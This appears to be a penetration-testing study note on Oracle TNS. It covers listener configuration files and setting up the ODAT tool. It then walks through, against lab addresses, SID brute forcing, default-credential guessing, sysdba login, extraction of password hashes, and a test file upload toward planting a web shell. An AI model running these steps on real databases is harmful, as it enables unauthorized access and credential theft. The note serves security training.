
---
Oralce TNS: Oracle Transparent Network Substrate

TNS supports various networking protocols between Oracle databases and client applications, such as `IPX/SPX` and 
`TCP/IP` protocol stacks.

By default, the listener listens for incoming connections on the `TCP/1521` port. However, this default port can be changed during installation or later in the configuration file.

By default, Oracle TNS can be remotely managed in `Oracle 8i`/`9i` but not in Oracle 10g/11g.
 
The configuration files for Oracle TNS are called 
`tnsnames.ora` and `listener.ora` and are typically located in the `$ORACLE_HOME/network/admin` directory.
 
#### Tnsnames.ora
Each database or service has a unique entry in the [tnsnames.ora](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007) file, containing the necessary information for clients to connect to the service. The entry consists of a name for the service, the network location of the service, and the database or service name that clients should use when connecting to the service.

Something like this:
```bash
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```
#### Listener.ora
`listener.ora` file is a server-side configuration file that defines the listener process's properties and parameters, which is responsible for receiving incoming client requests and forwarding them to the appropriate Oracle database instance.
```bash
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```
#### Blacklist Protection
Oracle databases can be protected by using so-called PL/SQL Exclusion List (`PlsqlExclusionList`). It is a user-created text file that needs to be placed in the 
`$ORACLE_HOME/sqldeveloper` directory.

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|
### ODAT
Python3 3.13.11 environment
```bash
sudo apt-get update

sudo apt-get install -y build-essential python3-dev python3-venv python3-pip libaio1t64 libaio-dev libgmp-dev git wget

cd ~

wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz

tar xzf cx_Oracle-8.3.0.tar.gz

git clone https://github.com/quentinhardy/odat.git

mkdir -p ~/Arsenal

mv odat ~/Arsenal/

cd ~/Arsenal/odat

python3 -m venv .venv

source .venv/bin/activate

pip3 install --upgrade pip

pip3 install "setuptools<82" wheel

pip3 install --no-build-isolation ~/cx_Oracle-8.3.0

pip3 install python-libnmap colorlog termcolor passlib pycryptodome openpyxl scapy pyasyncore

git submodule init

git submodule update

python3 odat.py -h
```
#### Nmap SID Bruteforcing
System Identifier (`SID`) is a unique name that identifies a particular database instance.
```bash
hcx05@htb[/htb]$ sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute

Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute: 
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```
#### ODAT Attack
```bash
hcx05@htb[/htb]$ ./odat.py all -s 10.129.204.235
#all: Preform all kind of module

[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

<SNIP>

[!] Notice: 'mdsys' account is locked, so skipping this username for password           
#####################| ETA:  00:01:16 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       
#####################| ETA:  00:01:05 
[!] Notice: 'outln' account is locked, so skipping this username for password           
#####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

<SNIP>
```
### SQLplus Setup
```bash
sudo apt update 
sudo apt install oracle-instantclient-sqlplus
```

```bash
sqlplus -v

sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
```

```bash
sudo sh -c "echo /usr/lib/oracle/[version]/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf"
```
#### SQLplus
```bash
hcx05@htb[/htb]$ sqlplus [username]/[password]@10.129.204.235/XE

SQL*Plus: Release 19.0.0.0.0 - Production
Version 19.6.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```
[SQLplus commands](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985)
#### Prev Esc
- OS authentication: If there is a misconfiguration that put the couurnt user in the `dba` in Linux, or `ORA_DBA` in Windows.
- Password File: If there is a misconfiguration in the password file(`orapwXE`) that give the current user `SYSDBA` privilege.
```bash
hcx05@htb[/htb]$ sqlplus scott/tiger@10.129.204.235/XE as sysdba

SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
<SNIP>
```
#### Oracle RDBMS - Extract Password Hashes
```bash
SQL> select name, password from sys.user$;
```
#### Oracle RDBMS - Web Shell Upload
Uptate to the root directory

|**OS**|**Path**|
|---|---|
|Linux|`/var/www/html`|
|Windows|`C:\inetpub\wwwroot`|
First, trying our exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention systems.
```bash
hcx05@htb[/htb]$ echo "Oracle File Upload Test" > testing.txt
hcx05@htb[/htb]$ ./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt

[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```
Test
```bash
hcx05@htb[/htb]$ curl -X GET http://10.129.204.235/testing.txt

Oracle File Upload Test
```















